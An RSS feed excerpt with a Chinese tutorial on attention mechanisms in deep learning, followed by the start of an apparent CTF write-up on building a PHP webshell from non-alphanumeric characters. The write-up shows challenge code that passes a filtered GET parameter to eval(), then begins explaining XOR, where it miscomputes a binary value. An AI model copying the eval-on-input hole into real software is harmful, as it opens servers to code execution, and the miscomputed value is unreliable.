&lt;p&gt;　　Encoder-Decoder是个非常通用的计算框架，至于Encoder和Decoder具体使用什么模型都是由研究者自己定的，常见的比如 CNN / RNN / BiRNN / GRU / LSTM / Deep LSTM 等，这里的变化组合非常多。 ------（思考：人的学习过程包括输入、输出、外界评价。Encoder模型类似于人的输入学习过程，Decoder模型类似于人的输出学习过程，对输出的内容进行评价就类似于损失函数。英语老师给我上了几堂英语课，我在不断的输入Encoder；突然有一个随堂测试，我得做题输出Decoder；最后英语老师改卷子，给我一个分数，不对的地方我得反思调整我对输入数据的加工方式。）-------（再思考：关于英语翻译。课本上的单词和课文是原始数据输入，相当于X；我在大脑里加工这些数据，相当于Encoder模型，我的脑子里有很多加工后的数据，相当于C；现在要让我翻译一个英语句子，这个任务相当于Y，我不能翻课本，所以我只能借助我脑袋里加工的数据C去翻译这个句子，即我得动脑子，相当于Decoder。 学习的过程是什么都要学，要分类整理，要增加线索，并不知道未来的某天能用到什么，所以Encoder-Decoder是一个泛泛学习的框架）&lt;/p&gt;

&lt;p&gt;　　以上介绍的Encoder-Decoder模型是没有体现出“注意力模型”的，所以可以把它看作是注意力不集中的分心模型。为什么说它注意力不集中呢？请观察下目标句子Y中每个单词的生成过程如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806141638641-1078830067.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　其中&lt;strong&gt;f是decoder的非线性变换函数&lt;/strong&gt;。从这里可以看出，在生成目标句子的单词时，不论生成哪个单词，是y1,y2也好，还是y3也好，他们使用的句子X的语义编码C都是一样的，没有任何区别。而语义编码C是由句子X的每个单词经过Encoder 编码产生的，这意味着不论是生成哪个单词，y1,y2还是y3，其实&lt;span&gt;&lt;strong&gt;句子X中任意单词对生成某个目标单词yi来说影响力都是相同的，没有任何区别&lt;/strong&gt;&lt;/span&gt;（&lt;span&gt;其实如果Encoder是RNN的话，理论上越是后输入的单词影响越大，并非等权的，估计这也是为何Google提出Sequence to Sequence模型时发现把输入句子逆序输入做翻译效果会更好的小Trick的原因&lt;/span&gt;）。这就是为何说这个模型&lt;strong&gt;没有体现出注意力&lt;/strong&gt;的缘由。&lt;/p&gt;
&lt;p&gt;　　引入AM模型，以翻译一个英语句子举例：输入X：Tom chase Jerry。 理想输出：汤姆追逐杰瑞。&lt;/p&gt;
&lt;p&gt;　　应该在翻译“杰瑞”的时候，体现出英文单词对于翻译当前中文单词不同的影响程度，比如给出类似下面一个概率分布值：&lt;/p&gt;
&lt;p&gt;（Tom,0.3）（Chase,0.2）（Jerry,0.5）&lt;/p&gt;
&lt;p&gt;　　每个英文单词的概率代表了翻译当前单词“杰瑞”时，注意力分配模型分配给不同英文单词的注意力大小。这对于正确翻译目标语单词肯定是有帮助的，因为引入了新的信息。同理，目标句子中的每个单词都应该学会其对应的源语句子中单词的注意力分配概率信息。这意味着在生成每个单词Yi的时候，&lt;span&gt;&lt;strong&gt;原先都是相同的中间语义表示C会替换成根据当前生成单词而不断变化的Ci&lt;/strong&gt;&lt;/span&gt;。&lt;span&gt;&lt;strong&gt;理解AM模型的关键就是这里，即由固定的中间语义表示C换成了根据当前输出单词来调整成加入注&lt;/strong&gt;&lt;strong&gt;意力模型的变化的&lt;/strong&gt;&lt;strong&gt;Ci&lt;/strong&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806142115912-1682939089.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图2 引入AM模型的Encoder-Decoder框架&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　即生成目标句子单词的过程成了下面的形式：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806142159178-1634092293.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　而&lt;strong&gt;每个Ci可能对应着不同的源语句子单词的注意力分配概率分布&lt;/strong&gt;，比如对于上面的英汉翻译来说，其对应的信息可能如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806142302309-2112006022.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　其中，&lt;strong&gt;f2函数代表Encoder对输入英文单词的某种变换函数&lt;/strong&gt;，比如如果Encoder是用的RNN模型的话，这个f2函数的结果往往是某个时刻输入xi后隐层节点的状态值；&lt;strong&gt;g代表Encoder根据单词的中间表示合成整个句子中间语义表示的变换函数&lt;/strong&gt;，一般的做法中，&lt;strong&gt;g函数就是对构成元素加权求和&lt;/strong&gt;，也就是常常在论文里看到的下列公式：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806142333000-1492896283.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　假设Ci中那个i就是上面的“汤姆”，那么&lt;strong&gt;Tx就是3，代表输入句子的长度&lt;/strong&gt;，h1=f(“Tom”)，h2=f(“Chase”),h3=f(“Jerry”)，对应的注意力模型权值分别是0.6,0.2,0.2，&lt;strong&gt;所以g函数就是个加权求和函数&lt;/strong&gt;。如果形象表示的话，翻译中文单词“汤姆”的时候，数学公式对应的&lt;strong&gt;中间语义表示Ci的形成过程&lt;/strong&gt;类似下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806142412460-1178080370.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图3 Ci的形成过程&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　这里还有一个问题：生成目标句子某个单词，比如“汤姆”的时候，&lt;strong&gt;你怎么知道AM模型所需要的输入句子单词注意力分配概率分布值呢？&lt;/strong&gt;就是说“汤姆”对应的概率分布：&lt;/p&gt;
&lt;h4&gt;　　划重点(注意力权重获取的过程)（Tom,0.3）（Chase,0.2）（Jerry,0.5）是如何得到的呢？&lt;/h4&gt;
&lt;p&gt;　　为了便于说明，我们假设对图1的非AM模型的Encoder-Decoder框架进行细化，Encoder采用RNN模型，Decoder也采用RNN模型，这是比较常见的一种模型配置，则图1的图转换为下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806142520665-1351011214.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图4 RNN作为具体模型的Encoder-Decoder框架&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　注意力分配概率分布值的通用计算过程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806142634471-1534518198.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图5 AM注意力分配概率计算&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　对于采用RNN的Decoder来说，如果要生成 yi 单词，在时刻 i ，我们是可以知道在生成 Yi 之前的隐层节点i时刻的输出值 Hi 的，而我们的目的是要计算生成 Yi 时的输入句子单词“Tom”、“Chase”、“Jerry”对 Yi 来说的注意力分配概率分布，那么可以用i时刻的&lt;strong&gt;隐层节点状态 Hi 去一一和输入句子中每个单词对应的RNN隐层节点状态 hj 进行对比&lt;/strong&gt;，即&lt;strong&gt;通过函数 F(hj,Hi) 来获得目标单词 Yi 和每个输入单词对应的对齐可能性&lt;/strong&gt;，这个F函数在不同论文里可能会采取不同的方法，然后&lt;strong&gt;函数F的输出经过Softmax进行归一化就得到了符合概率分布取值区间的注意力分配概率分布数值（这就得到了注意力权重）&lt;/strong&gt;。图5显示的是当输出单词为“汤姆”时刻对应的输入句子单词的对齐概率。绝大多数AM模型都是&lt;strong&gt;采取上述的计算框架来计算注意力分配概率分布信息&lt;/strong&gt;，&lt;strong&gt;区别只是在F的定义上可能有所不同&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　上述内容就是论文里面常常提到的Soft Attention Model&lt;/strong&gt;（任何数据都会给一个权值，没有筛选条件）的基本思想&lt;/span&gt;，你能在文献里面看到的大多数AM模型基本就是这个模型，区别很可能只是把这个模型用来解决不同的应用问题。那么&lt;strong&gt;怎么理解AM模型的物理含义呢？&lt;/strong&gt;一般文献里会把AM模型看作是&lt;strong&gt;单词对齐模型&lt;/strong&gt;，这是非常有道理的。目标句子生成的每个单词对应输入句子单词的概率分布可以理解为输入句子单词和这个目标生成单词的&lt;strong&gt;&lt;span&gt;对齐概率&lt;/span&gt;&lt;/strong&gt;，这在机器翻译语境下是非常直观的：&lt;strong&gt;传统的统计机器翻译一般在做的过程中会专门有一个短语对齐的步骤&lt;/strong&gt;，&lt;strong&gt;而注意力模型其实起的是相同的作用&lt;/strong&gt;。在其他应用里面把AM模型理解成输入句子和目标句子单词之间的对齐概率也是很顺畅的想法。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806164619665-1207996587.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图6 Google 神经网络机器翻译系统结构图&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　图6所示即为Google于2016年部署到线上的基于神经网络的机器翻译系统，相对传统模型翻译效果有大幅提升，翻译错误率降低了60%，其架构就是上文所述的加上Attention机制的Encoder-Decoder框架，主要区别无非是其Encoder和Decoder使用了8层叠加的LSTM模型。&lt;/p&gt;
&lt;p&gt;当然，从概念上理解的话，&lt;strong&gt;把AM模型理解成影响力模型也是合理的&lt;/strong&gt;，就是说生成目标单词的时候，输入句子每个单词对于生成这个单词有多大的影响程度。这种想法也是比较好理解AM模型物理意义的一种思维方式。&lt;/p&gt;
&lt;p&gt;　　图7是论文“&lt;a href=&quot;http://www.aclweb.org/anthology/D15-1044&quot;&gt;A Neural Attention Model for Sentence Summarization&lt;/a&gt;”中，Rush用AM模型来做生成式摘要给出的一个AM的一个非常直观的例子。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806143753246-1275015223.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图7 句子生成式摘要例子&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　这个例子中，Encoder-Decoder框架的输入句子X是：“russian defense minister ivanov called sunday for the creation of a joint front for combating global terrorism”。对应图中纵坐标的句子。系统生成的摘要句子Y是：“russia calls for joint front against terrorism”，对应图中横坐标的句子。可以看出模型已经把句子主体部分正确地抽出来了。&lt;strong&gt;矩阵中每一列代表生成的目标单词对应输入句子每个单词的AM分配概率&lt;/strong&gt;，颜色越深代表分配到的概率越大。这个例子对于直观理解AM是很有帮助作用。&lt;/p&gt;
&lt;p&gt;　　《&lt;a href=&quot;http://www.aclweb.org/anthology/D15-1044&quot;&gt;A Neural Attention Model for Sentence Summarization&lt;/a&gt;》论文提供的实验数据集链接(开放可用)：&lt;a href=&quot;https://duc.nist.gov/data.html&quot;&gt;DUC 2004&lt;/a&gt;，感兴趣的朋友可以下载看看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806143957137-1497662277.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图8 摘要生成 开放数据集&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;　　如果把Attention机制从上文讲述例子中的Encoder-Decoder框架中剥离，并进一步做抽象，可以更容易看懂Attention机制的本质思想。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806165033943-1072442256.png&quot; alt=&quot;&quot; width=&quot;853&quot; height=&quot;375&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图9 Attention机制的本质思想&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　我们可以这样来看待Attention机制（参考图9）：将Source中的构成元素想象成是由一系列的&amp;lt;Key,Value&amp;gt;数据对构成，此时给定Target中的某个元素Query，通过计算Query和各个Key的相似性或者相关性，得到每个Key对应Value的权重系数，然后对Value进行加权求和，即得到了最终的Attention数值。所以本质上Attention机制是对Source中元素的Value值进行加权求和，而Query和Key用来计算对应Value的权重系数。即可以将其本质思想改写为如下公式：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806165351485-870137528.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　其中，&lt;img src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ptp8P184xjxeRHqppry03SX1TTiblocHfib0KzXZMPJysQJHuQPzYxE5gXcb0nk5p1puZ3kg9EhCbFibfY5lkGA8A/640?wx_fmt=png&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&quot; alt=&quot;&quot;/&gt;=||Source||代表Source的长度，公式含义即如上所述。上文所举的机器翻译的例子里，因为在计算Attention的过程中，Source中的Key和Value合二为一，指向的是同一个东西，也即输入句子中每个单词对应的语义编码，所以可能不容易看出这种能够体现本质思想的结构。&lt;/p&gt;
&lt;p&gt;　　当然，从概念上理解，把Attention仍然理解为从大量信息中有选择地筛选出少量重要信息并聚焦到这些重要信息上，忽略大多不重要的信息，这种思路仍然成立。聚焦的过程体现在权重系数的计算上，权重越大越聚焦于其对应的Value值上，即权重代表了信息的重要性，而Value是其对应的信息。&lt;/p&gt;
&lt;p&gt;　　从图9可以引出另外一种理解，也可以将Attention机制看作一种软寻址（Soft Addressing）:Source可以看作存储器内存储的内容，元素由地址Key和值Value组成，当前有个Key=Query的查询，目的是取出存储器中对应的Value值，即Attention数值。通过Query和存储器内元素Key的地址进行相似性比较来寻址，之所以说是软寻址，指的不像一般寻址只从存储内容里面找出一条内容，而是可能从每个Key地址都会取出内容，取出内容的重要性根据Query和Key的相似性来决定，之后对Value进行加权求和，这样就可以取出最终的Value值，也即Attention值。所以不少研究人员将Attention机制看作软寻址的一种特例，这也是非常有道理的。&lt;/p&gt;
&lt;p&gt;　　至于Attention机制的具体计算过程，如果对目前大多数方法进行抽象的话，可以将其归纳为两个过程：第一个过程是根据Query和Key计算权重系数，第二个过程根据权重系数对Value进行加权求和。而第一个过程又可以细分为两个阶段：第一个阶段根据Query和Key计算两者的相似性或者相关性；第二个阶段对第一阶段的原始分值进行归一化处理；这样，可以将Attention的计算过程抽象为如图10展示的三个阶段。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806191525966-820975705.png&quot; alt=&quot;&quot; width=&quot;704&quot; height=&quot;627&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图10 三阶段计算Attention过程&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;　　在第一个阶段，可以引入不同的函数和计算机制，根据Query和某个&lt;img src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ptp8P184xjxeRHqppry03SX1TTiblocHf8GpiaicI5ic1WVVOVmPmiadhXTqh5Wp5867WnSO5hicXDfYNBLiawKAn01lA/640?wx_fmt=png&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&quot; alt=&quot;&quot;/&gt;，计算两者的相似性或者相关性，最常见的方法包括：求两者的向量点积、求两者的向量Cosine相似性或者通过再引入额外的神经网络来求值，即如下方式：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806191654338-264846698.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　第一阶段产生的分值根据具体产生的方法不同其数值取值范围也不一样，第二阶段引入类似SoftMax的计算方式对第一阶段的得分进行数值转换，一方面可以进行归一化，将原始计算分值整理成所有元素权重之和为1的概率分布；另一方面也可以通过SoftMax的内在机制更加突出重要元素的权重。即一般采用如下公式计算：&lt;/p&gt;
&lt;p&gt;  &lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806195333945-948374778.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　第二阶段的计算结果&lt;img src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ptp8P184xjxeRHqppry03SX1TTiblocHfUibJS5EJIISMNJIOnjq8pg5tfFvaroZpyRibHIEStTDPXvKDZSKFCwjg/640?wx_fmt=png&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&quot; alt=&quot;&quot;/&gt;即为&lt;img src=&quot;https://mmbiz.qpic.cn/mmbiz_png/ptp8P184xjxeRHqppry03SX1TTiblocHfrGdeIIwxKb0q16iazmxSwfhCGByicJ66qXNkdaOnFwOHyO1DNLWreAeA/640?wx_fmt=png&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&quot; alt=&quot;&quot;/&gt;对应的权重系数，然后进行加权求和即可得到Attention数值：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806195421837-251685236.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　通过如上三个阶段的计算，即可求出针对Query的Attention数值，目前绝大多数具体的注意力机制计算方法都符合上述的三阶段抽象计算过程。&lt;/p&gt;

&lt;p&gt;　　通过上述对Attention本质思想的梳理，我们可以更容易理解本节介绍的Self Attention模型。&lt;strong&gt;Self Attention也经常被称为intra Attention（内部Attention）&lt;/strong&gt;，最近一年也获得了比较广泛的使用，比如Google最新的机器翻译模型内部大量采用了Self Attention模型。&lt;/p&gt;
&lt;p&gt;　　在一般任务的Encoder-Decoder框架中，输入Source和输出Target内容是不一样的，比如对于英-中机器翻译来说，Source是英文句子，Target是对应的翻译出的中文句子，Attention机制发生在Target的元素和Source中的所有元素之间。&lt;span&gt;&lt;strong&gt;而Self Attention顾名思义，指的不是Target和Source之间的Attention机制，而是Source内部元素之间或者Target内部元素之间发生的Attention机制，也可以理解为Target=Source这种特殊情况下的注意力计算机制。&lt;/strong&gt;&lt;/span&gt;其具体计算过程是一样的，只是计算对象发生了变化而已，所以此处不再赘述其计算过程细节。&lt;/p&gt;
&lt;p&gt;　　如果是常规的Target不等于Source情形下的注意力计算，其物理含义正如上文所讲，比如对于机器翻译来说，本质上是目标语单词和源语单词之间的一种单词对齐机制。那么如果是Self Attention机制，一个很自然的问题是：通过Self Attention到底学到了哪些规律或者抽取出了哪些特征呢？或者说引入Self Attention有什么增益或者好处呢？我们仍然以机器翻译中的Self Attention来说明，图11和图12是可视化地表示Self Attention在同一个英语句子内单词间产生的联系。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806200854591-1266493040.png&quot; alt=&quot;&quot; width=&quot;345&quot; height=&quot;667&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图11 可视化Self Attention实例&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806200949175-1322518214.png&quot; alt=&quot;&quot; width=&quot;353&quot; height=&quot;539&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图12 可视化Self Attention实例&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　从两张图（图11、图12）可以看出，&lt;span&gt;&lt;strong&gt;Self Attention可以捕获同一个句子中单词之间的一些&lt;span&gt;句法特征&lt;/span&gt;（比如图11展示的有一定距离的短语结构）或者&lt;span&gt;语义特征&lt;/span&gt;（比如图12展示的its的指代对象Law）。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　很明显，&lt;span&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;引入Self Attention后会更容易捕获句子中长距离的相互依赖的特征&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;，&lt;span&gt;&lt;strong&gt;因为如果是RNN或者LSTM，需要依次序序列计算，对于远距离的相互依赖的特征，要经过若干时间步步骤的信息累积才能将两者联系起来，而距离越远，有效捕获的可能性越小。&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　但是Self Attention在计算过程中会直接将句子中任意两个单词的联系通过一个计算步骤直接联系起来，所以&lt;strong&gt;远距离依赖特征之间的距离被极大缩短&lt;/strong&gt;，有利于有效地利用这些特征。除此外，&lt;strong&gt;Self Attention对于增加计算的并行性也有直接帮助作用&lt;/strong&gt;。这是为何Self Attention逐渐被广泛使用的主要原因。&lt;/p&gt;

&lt;p&gt;　　前文有述，Attention机制在深度学习的各种应用领域都有广泛的使用场景。上文在介绍过程中我们主要以自然语言处理中的机器翻译任务作为例子，下面分别再从图像处理领域和语音识别选择典型应用实例来对其应用做简单说明。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806201528694-471360423.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图13 图片-描述任务的Encoder-Decoder框架&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　图片描述（Image-Caption）是一种典型的图文结合的深度学习应用，输入一张图片，人工智能系统输出一句描述句子，语义等价地描述图片所示内容。很明显这种应用场景也可以使用Encoder-Decoder框架来解决任务目标，此时Encoder输入部分是一张图片，一般会用CNN来对图片进行特征抽取，Decoder部分使用RNN或者LSTM来输出自然语言句子（参考图13）。&lt;/p&gt;
&lt;p&gt;　　此时如果加入Attention机制能够明显改善系统输出效果，Attention模型在这里起到了类似人类视觉选择性注意的机制，在输出某个实体单词的时候会将注意力焦点聚焦在图片中相应的区域上。图14给出了根据给定图片生成句子“A person is standing on a beach with a surfboard.”过程时每个单词对应图片中的注意力聚焦区域。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806202339239-1941931195.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图14 图片生成句子中每个单词时的注意力聚焦区域&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　图15给出了另外四个例子形象地展示了这种过程，每个例子上方左侧是输入的原图，下方句子是人工智能系统自动产生的描述语句，上方右侧图展示了当AI系统产生语句中划横线单词的时候，对应图片中聚焦的位置区域。比如当输出单词dog的时候，AI系统会将注意力更多地分配给图片中小狗对应的位置。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806202445195-2069204981.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图15 图像描述任务中Attention机制的聚焦作用&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1192699/201808/1192699-20180806202531182-629399120.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;图16 语音识别中音频序列和输出字符之间的Attention&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　语音识别的任务目标是将语音流信号转换成文字，所以也是Encoder-Decoder的典型应用场景。Encoder部分的Source输入是语音流信号，Decoder部分输出语音对应的字符串流。&lt;/p&gt;
&lt;p&gt;　　图16可视化地展示了在Encoder-Decoder框架中加入Attention机制后，当用户用语音说句子 how much would a woodchuck chuck 时，输入部分的声音特征信号和输出字符之间的注意力分配概率分布情况，颜色越深代表分配到的注意力概率越高。从图中可以看出，在这个场景下，Attention机制起到了将输出字符和输入语音信号进行对齐的功能。&lt;/p&gt;
&lt;p&gt;　　上述内容仅仅选取了不同AI领域的几个典型Attention机制应用实例，Encoder-Decoder加Attention架构由于其卓越的实际效果，目前在深度学习领域里得到了广泛的使用，了解并熟练使用这一架构对于解决实际问题会有极大帮助。&lt;/p&gt;

&lt;hr/&gt;
&lt;p&gt;参考文章：&lt;/p&gt;
&lt;p&gt;【1】&lt;a href=&quot;https://blog.csdn.net/malefactor/article/details/50550211&quot;&gt;自然语言处理中的Attention Model：是什么及为什么&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;【2】&lt;a href=&quot;https://blog.csdn.net/malefactor/article/details/78767781&quot;&gt;深度学习中的注意力机制(2017版)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;【3】&lt;a href=&quot;https://blog.csdn.net/joshuaxx316/article/details/70665388&quot;&gt;Attention注意力机制--原理与应用&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;【4】&lt;span&gt;&lt;a href=&quot;https://github.com/Choco31415/Attention_Network_With_Keras&quot; data-pjax=&quot;#js-repo-pjax-container&quot;&gt;Attention_Network_With_Keras&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;【5】&lt;a href=&quot;https://blog.csdn.net/john_xyz/article/details/80650677&quot; target=&quot;_blank&quot;&gt;《A Self-Attention Setentence Embedding》阅读笔记及实践&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 06 Aug 2018 13:55:00 +0000</pubDate>
<dc:creator>郭耀华</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/guoyaohua/p/9429924.html</dc:identifier>
</item>
<item>
<title>记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门) - Angel_Kitty</title>
<link>http://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</guid>
<description>&lt;p&gt;最近在做代码审计的工作中遇到了一个难题，题目描述如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
&lt;/span&gt;&lt;span&gt;include&lt;/span&gt; 'flag.php'&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['code'&lt;span&gt;])){
    &lt;/span&gt;&lt;span&gt;$code&lt;/span&gt; = &lt;span&gt;$_GET&lt;/span&gt;['code'&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$code&lt;/span&gt;)&amp;gt;40&lt;span&gt;){
        &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;(&quot;Long.&quot;&lt;span&gt;);
    }
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;preg_match&lt;/span&gt;(&quot;/[A-Za-z0-9]+/&quot;,&lt;span&gt;$code&lt;/span&gt;&lt;span&gt;)){
        &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;(&quot;NO.&quot;&lt;span&gt;);
    }
    @&lt;/span&gt;&lt;span&gt;eval&lt;/span&gt;(&lt;span&gt;$code&lt;/span&gt;&lt;span&gt;);
}&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{
    &lt;/span&gt;&lt;span&gt;highlight_file&lt;/span&gt;(&lt;span&gt;__FILE__&lt;/span&gt;&lt;span&gt;);
}
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;$hint =  &quot;php function getFlag() to get flag&quot;;&lt;/span&gt;
?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这一串代码描述是这样子，我们要绕过A-Za-z0-9这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 a-z 中任意一个字符，并且字符串长度小于40。然后再利用 PHP允许动态函数执行的特点，拼接处一个函数名，这里我们是 &quot;&lt;strong&gt;getFlag&lt;/strong&gt;&quot;，然后动态执行之即可。&lt;/p&gt;
&lt;p&gt;那么，我们需要考虑的问题是如何通过各种变换，使得我们能够去成功读取到getFlag函数，然后拿到webshell。&lt;/p&gt;

&lt;p&gt;在理解这篇文章之前，我们首先需要大家了解的是PHP中异或(^)的概念。&lt;/p&gt;
&lt;p&gt;我们先看一下下面这段代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;A&quot;^&quot;?&quot;&lt;span&gt;;
&lt;/span&gt;?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;运行结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1100338/201808/1100338-20180806200625542-1193111149.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们可以看到，输出的结果是字符&quot;~&quot;。之所以会得到这样的结果，是因为代码中对字符&quot;A&quot;和字符&quot;?&quot;进行了异或操作。在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。异或操作有时也被用来交换两个变量的值。&lt;/p&gt;
&lt;p&gt;比如像上面这个例子&lt;/p&gt;
&lt;p&gt;A的ASCII值是65，对应的二进制值是01000001&lt;/p&gt;
&lt;p&gt;?的ASCII值是63，对应的二进制值是00111111&lt;/p&gt;
&lt;p&gt;异或的二进制的值是10000000，对应的ASCII值是126，对应的字符串的值就是~了&lt;/p&gt;
